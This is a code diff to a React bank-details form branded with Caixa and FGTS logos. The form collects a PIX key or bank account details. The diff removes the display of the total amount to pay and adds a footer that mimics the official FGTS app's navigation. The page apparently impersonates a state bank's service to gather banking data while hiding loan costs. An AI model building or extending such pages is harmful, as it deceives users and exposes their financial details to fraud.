@@ -1,7 +1,7 @@
 
 import React, { useState } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
-import { ArrowRight, CreditCard, BanknoteIcon, User, Check } from 'lucide-react';
+import { ArrowRight, CreditCard, BanknoteIcon, User, Check, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
 import FGTSLogo from '@/components/FGTSLogo';
 import { Button } from '@/components/ui/button';
@@ -98,10 +98,6 @@ const BankDetails = () => {
                 <div className="text-sm text-gray-500">Taxa de juros</div>
                 <div className="font-medium">{(interestRate * 100).toFixed(1)}% ao mês</div>
               </div>
-              <div>
-                <div className="text-sm text-gray-500">Valor total a pagar</div>
-                <div className="font-medium">{formatCurrency(installmentValue * installmentsCount)}</div>
-              </div>
             </div>
           </div>
           
@@ -197,7 +193,7 @@ const BankDetails = () => {
           
           {/* Submit button */}
           <Button 
-            className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full"
+            className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full mb-16"
             onClick={handleSubmit}
             disabled={paymentMethod === 'pix' ? !pixKey : (!bankName || !accountNumber || !branch)}
           >
@@ -205,6 +201,34 @@ const BankDetails = () => {
             CONFIRMAR DADOS BANCÁRIOS
             <ArrowRight className="w-5 h-5 ml-2" />
           </Button>
+        </div>
+        
+        {/* Footer */}
+        <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
+          <div className="flex justify-around items-center py-3">
+            <div className="flex flex-col items-center text-gray-500">
+              <Home size={24} />
+              <span className="text-xs mt-1">Principal</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <BarChart3 size={24} />
+              <span className="text-xs mt-1">Meu FGTS</span>
+            </div>
+            <div className="flex flex-col items-center">
+              <div className="bg-[#FF8C00] rounded-full w-12 h-12 flex items-center justify-center">
+                <DollarSign size={24} className="text-white" />
+              </div>
+              <span className="text-xs mt-1 text-[#FF8C00]">Mais Saques</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <HelpCircle size={24} />
+              <span className="text-xs mt-1">Ajuda</span>
+            </div>
+            <div className="flex flex-col items-center text-gray-500">
+              <MoreHorizontal size={24} />
+              <span className="text-xs mt-1">Mais</span>
+            </div>
+          </div>
         </div>
       </div>
     </div>
